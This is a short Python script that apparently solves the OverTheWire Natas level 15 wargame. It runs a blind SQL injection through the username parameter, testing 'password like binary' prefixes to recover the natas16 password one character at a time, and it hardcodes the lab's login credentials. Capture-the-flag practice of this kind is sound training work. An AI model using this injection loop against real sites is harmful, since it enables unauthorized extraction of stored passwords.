import requests
import re

# http basic authentication
credentials = ("natas15" , "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J")
alphabet="abcdefghijklmnopqrstuvxywzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

url_base = "http://natas15.natas.labs.overthewire.org"
username="natas16"

pass_sure=""

for x in range(0,32):
    print("cicle: "+str(x))
    for letter in alphabet:
        newpass = pass_sure+letter
        query= '?username={}"+and+password+like+binary+"{}%'.format(username,newpass) 
        page = requests.get(url_base+query,auth=credentials)
        #print(query)
        # se user exists -> aggiorna pass e esci dal ciclo
        if re.search("This user exists",page.text):
            pass_sure=newpass
            print("MATCH: "+pass_sure)
            break

print("Password is: "+pass_sure)
